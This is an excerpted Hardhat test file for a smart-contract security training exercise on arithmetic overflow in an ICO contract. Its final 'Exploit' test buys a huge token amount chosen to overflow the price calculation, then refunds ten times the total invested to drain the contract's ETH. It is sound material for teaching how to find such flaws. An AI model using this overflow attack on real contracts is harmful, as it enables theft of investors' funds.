...
describe('Arithmetic Over/Underflow Exercise 3', function () {
	...
	const TOTAL_INVESTED = FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED)
		...
		.sub(SECOND_INVESTOR_REFUNDED); // 674
	...
	before(async function () {
		...
		initialAttackerBalancer = await ethers.provider.getBalance(attacker.address);
	...
	it('Investments Tests', async function () {
		// Should Fail (no ETH)
		await expect(ico.connect(investor1).buy(FIRST_INVESTOR_INVESTED.mul(10))).to.be.revertedWith(
		...
		expect(await token.balanceOf(investor1.address)).to.be.equal(FIRST_INVESTOR_INVESTED.mul(10));
		expect(await token.balanceOf(investor2.address)).to.be.equal(SECOND_INVESTOR_INVESTED.mul(10));
		expect(await token.balanceOf(investor3.address)).to.be.equal(THIRD_INVESTOR_INVESTED.mul(10));
	...
	it('Refund Tests', async function () {
		...
		await expect(ico.connect(investor2).refund(SECOND_INVESTOR_INVESTED.mul(100))).to.be.revertedWith(
	...
	it('Exploit', async function () {
		...
		const tokensToBuy = ethers.constants.MaxUint256.div(10).add(1);

		await ico.connect(attacker).buy(tokensToBuy);

		await ico.connect(attacker).refund(TOTAL_INVESTED.mul(10));
	});
